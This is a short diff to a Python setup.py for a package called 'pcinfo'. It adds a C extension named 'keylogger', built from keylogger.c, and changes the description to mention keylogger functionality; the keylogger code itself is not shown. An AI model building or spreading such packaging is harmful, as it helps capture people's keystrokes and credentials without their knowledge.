@@ -1,14 +1,18 @@
 from setuptools import setup, Extension
 
-module = Extension(
+pcinfo_module = Extension(
     'pcinfo',
     sources=['info.c'],
-    libraries=['Advapi32', 'Ws2_32'],
+)
+
+keylogger_module = Extension(
+    'keylogger',
+    sources=['keylogger.c'],
 )
 
 setup(
     name='pcinfo',
     version='0.1',
-    description='C module that provides PC information',
-    ext_modules=[module],
+    description='C modules that provide PC information and keylogger functionality',
+    ext_modules=[pcinfo_module, keylogger_module],
 )
